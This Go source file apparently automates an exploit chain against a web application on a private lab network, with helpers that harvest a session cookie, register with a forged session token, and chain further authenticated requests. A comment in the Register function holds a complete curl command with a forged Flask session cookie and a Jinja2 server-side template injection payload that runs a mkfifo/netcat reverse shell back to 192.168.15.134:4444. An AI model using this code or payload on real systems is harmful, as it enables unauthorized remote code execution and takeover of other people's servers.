package utils

import (
	"log"
	"net/http"
	"strings"
)

func ExtractTime(target string) string {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequest("HEAD", target+"/refreshTime", nil)
	if err != nil {
		log.Fatal(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	for _, c := range resp.Cookies() {
		if c.Name == "session" {
			return c.Value
		}
	}

	return ""
}

func Register(target string, token string, postdata string) string {
	// curl -vX POST  http://192.168.15.133:1999/register -H "Cookie: session=eyJ0aW1lIjo0NzM0MDA4NTQ2LjA4Mzc5NiwiYXV0aG9yaXplZCI6dHJ1ZX0.Z1rfQQ.Uwh3JfBveGejd1cM0SDvemQxZYI" -d "username={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.15.134%204444%20%3E%2Ftmp%2Ff').read()}}&password=asdf1234"
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	var data = strings.NewReader(postdata)
	req, err := http.NewRequest("POST", target+"/register", data)
	if err != nil {
		log.Fatal(err)
	}
	cookie := "session=" + token
	req.Header.Set("Cookie", cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	for _, c := range resp.Cookies() {
		if c.Name == "identifier" {
			return c.Value
		}
	}

	return ""
}

func RootUrl(target string, token string, identifier string, postdata string) string {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	var data = strings.NewReader(postdata)
	req, err := http.NewRequest("POST", target+"/", data)
	if err != nil {
		log.Fatal(err)
	}
	cookie := "session=" + token + "; identifier=" + identifier
	req.Header.Set("Cookie", cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	for _, c := range resp.Cookies() {
		if c.Name == "encodedJWT" {
			return c.Value
		}
	}

	return ""
}

func Shop(method string, target string, token string, postdata string, endpoint string) {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	var data = strings.NewReader(postdata)
	req, err := http.NewRequest(method, target+endpoint, data)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Set("Cookie", token)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
}
